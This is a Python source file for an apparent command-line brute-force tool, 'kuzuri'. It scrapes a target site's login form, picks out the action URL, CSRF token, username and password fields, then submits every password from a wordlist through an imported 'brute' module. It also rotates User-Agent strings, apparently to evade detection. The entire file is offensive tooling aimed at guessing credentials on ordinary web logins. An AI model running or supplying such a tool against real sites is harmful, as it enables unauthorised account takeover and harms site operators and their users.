#!usr/bin/python

import requests
import re
import readline
import logging

from urllib.parse import urlparse
from removed import user_agents
from removed import cli
from lib import brute


logging.basicConfig(format='[kuzuri]: %(message)s', level=logging.INFO)
LOGIN_PAGE = ["login", "session", "index", "admin",
    'cek', "check", "panel", "dashboard", "member"]


class LoginForm:

    def __init__(self):
        logging.info('Trying to find the login form')
        self.ua = self.useragent()
        self.action = None
        self.csrf = None
        self.pwfield = None
        self.data = {}
        self.headers = {}

    def forms(self, r):
        _forms = re.findall(r'(?si)(<form.*?form>)', r.text)

        if len(_forms) > 1:
            logging.info("found %s forms on this page", len(_forms))

        for num, form in enumerate(_forms, start=1):
            form = form.replace('><', '>\n<')
            _action = re.findall(
                r'(?si)action=(?P<quote>["\'])(.*?)(?P=quote)', form)
            if not _action:
                _action = r.url
            else:
                _action = _action[0][1]
                if _action in ("", '#') or _action.startswith('.'):
                    _action = r.url
                elif not re.search(r'(?i)^http', _action):
                    _action = '{0.scheme}://{0.netloc}{1}'.format(
                        urlparse(r.url),
                        '/' if not _action.startswith('/') else ""
                    ) + _action
            if re.search(r'(?i)' + '|'.join(LOGIN_PAGE), _action):
                logging.info('OK, action url %s', _action)
                self.action = _action
                break

        if self.action:
            inputs = re.findall(r'(?si)(<(?:input|button).*?>)', form)
            submit_button = False

            for inp in inputs:
                csrf = re.findall(
                    r'(?si)<input.*?name=(?P<quote>["\'])((.*(?:csrf|token|o?auth).*))(?P=quote)', inp)
                if csrf and not self.csrf:
                    csrf = re.search(r'^(.+?)["\']', csrf[0][1]).groups()[0]
                    logging.info('CSRF found: %s', csrf)
                    self.csrf = csrf
                if re.search(r'(?si)type=(?P<quote>["\']).+?(?P=quote)', inp):
                    local_data = dict(re.findall(
                        r'(?si)((?:name|value|type))=["\'](.*?)["\']', inp))
                    if not local_data.get("value"):
                        local_data["value"] = ""
                    if local_data.get('name'):
                        type = local_data.get("type")
                        if type == 'submit' and submit_button or not arg.hidden_inputs and type == "hidden":
                            continue
                        if type == "password":
                           self.pwfield = local_data["name"]
                        if type not in ('password', 'submit', 'hidden'):
                            question = type + "(" + local_data["name"] + "): "
                            if arg.username:
                                logging.info(question + arg.username)
                            else:
                                arg.username = input("[kuzuri]: " + question)
                            local_data["value"] = arg.username
                        if type == "submit":
                            submit_button = True
                        if local_data["name"] != self.csrf:
                            self.data[local_data["name"]] = local_data["value"]
            logging.info('POST data %s', self.data)
        else:
            exit(logging.info('no login form found on this page'))

    def webpage(self, url):
        logging.info('starting new %s connection with UserAgent %s',
                     urlparse(url).scheme.upper(), self.ua)
        _html = requests.get(url, headers={'User-Agent': self.ua})
        self.headers = _html.headers

        return _html

    def useragent(self):
        return user_agents.random()


if __name__ == '__main__':
    parser = cli.CLI()
    arg = parser.parse_args()

    try:
        if len(arg.password) == 1:
            arg.password = open(arg.password[0], 'r').read().splitlines()

        flow = LoginForm()
        html = flow.webpage(arg.url)
        flow.forms(html)

        logging.info("starting brute force attack")
        for num, pwd in enumerate(arg.password, start=1):
            logging.info("password(%s)[%s]: %s", flow.pwfield, num, pwd)

            flow.data[flow.pwfield] = pwd
            headers = {"User-Agent": flow.ua}

            if flow.csrf:
                 brute.with_csrf(url=html.url,
                                 action_url=flow.action,
                                 data=flow.data,
                                 csrf_name=flow.csrf,
                                 pwd=pwd,
                                 headers=headers,
                                 pattern=arg.regex_pattern)
            else:
                 brute.without_csrf(action_url=flow.action,
                                 data=flow.data,
                                 pwd=pwd,
                                 pattern=arg.regex_pattern)
        logging.info('password not found')
    except Exception as E:
        logging.info(str(E))


